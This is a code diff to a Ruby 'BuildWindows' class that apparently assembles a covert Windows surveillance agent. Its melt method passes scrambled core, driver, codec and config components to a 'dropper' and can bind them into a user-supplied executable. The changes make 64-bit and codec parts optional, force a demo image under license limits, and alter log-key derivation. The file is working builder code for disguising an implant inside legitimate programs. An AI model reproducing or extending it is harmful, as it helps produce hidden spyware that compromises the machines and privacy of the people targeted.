@@ -104,12 +104,19 @@ class BuildWindows < Build
   def melt(params)
     trace :debug, "Build: melting: #{params}"
 
-    @appname = params['appname'] || 'install'
+    @appname = params['appname'] || 'agent'
     @cooked = false
+
+    # overwrite the demo flag if the license doesn't allow it
+    params['demo'] = true unless LicenseManager.instance.limits[:agents][:windows][0]
 
     manifest = (params['admin'] == true) ? '1' : '0'
 
     executable = path('default')
+
+    # by default build the 64bit support
+    bit64 = (params['bit64'] == false) ? false : true
+    codec = (params['codec'] == false) ? false : true
 
     # use the user-provided file to melt with
     if params['input']
@@ -119,8 +126,7 @@ class BuildWindows < Build
 
     if params['cooked'] == true
       @cooked = true
-      key = @factory.logkey.chr.ord
-      key = "%02X" % ((key > 127) ? (key - 256) : key)
+      key = Digest::MD5.digest(@factory.logkey).unpack('H2').first.upcase
 
       # write the ini file
       File.open(path('cooker.ini'), 'w') do |f|
@@ -144,17 +150,16 @@ class BuildWindows < Build
 
     else
 
-      # TODO: add the demo parameter for the dropper here
-
       CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
-                                          path(@scrambled[:core64])+' '+
+                                          (bit64 ? path(@scrambled[:core64]) : 'null') +' '+
                                           path(@scrambled[:config])+' '+
                                           path(@scrambled[:driver])+' '+
-                                          path(@scrambled[:driver64])+' '+
-                                          path(@scrambled[:codec])+' '+
+                                          (bit64 ? path(@scrambled[:driver64]) : 'null') +' '+
+                                          (codec ? path(@scrambled[:codec]) : 'null') +' '+
                                           @scrambled[:dir]+' '+
                                           manifest +' '+
                                           @funcname +' '+
+                                          (params['demo'] ? path('demo_image') : 'null') +' '+
                                           executable + ' ' +
                                           path('output')
     end
